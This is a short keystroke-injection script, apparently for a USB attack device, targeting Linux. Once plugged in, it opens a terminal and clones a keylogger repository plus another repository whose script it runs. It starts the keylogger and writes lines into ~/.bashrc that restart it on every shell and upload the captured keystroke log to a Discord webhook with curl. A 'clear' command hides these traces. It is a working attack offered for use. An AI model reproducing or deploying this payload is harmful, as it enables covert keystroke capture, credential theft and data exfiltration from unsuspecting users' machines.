REM Target: Linux
ATTACKMODE HID STORAGE
DELAY 500
CTRL ALT t
DELAY 1000
STRING git clone https://github.com/dad1x/its_villain.git & git clone https://github.com/GiacomoLaw/Keylogger.git
ENTER
DELAY 2000
STRING cd its_villain
ENTER
DELAY 1000
STRING chmod +x ja.sh
ENTER
DELAY 1000
STRING ./ja.sh
ENTER
DELAY 1000
ALT CTRL t
DELAY 1000
STRING cd ~/Keylogger
ENTER
DELAY 1000
STRING cd linux
ENTER
STRING pip3 install -r requirements.txt
ENTER
DELAY 1000
STRING chmod +x keylogger.py
ENTER
ALT CTRL t
DELAY 1000
STRING python3 /home/$USER/Keylogger/linux/keylogger.py &
ENTER
ALT CTRL t
DELAY 1000
STRING echo "curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" " >> ~/.bashrc
ENTER
DELAY 10
STRING echo "python3 /home/$USER/Keylogger/linux/keylogger.py &" >> ~/.bashrc
ENTER
DELAY 10
STRING echo "clear" >> ~/.bashrc
ENTER

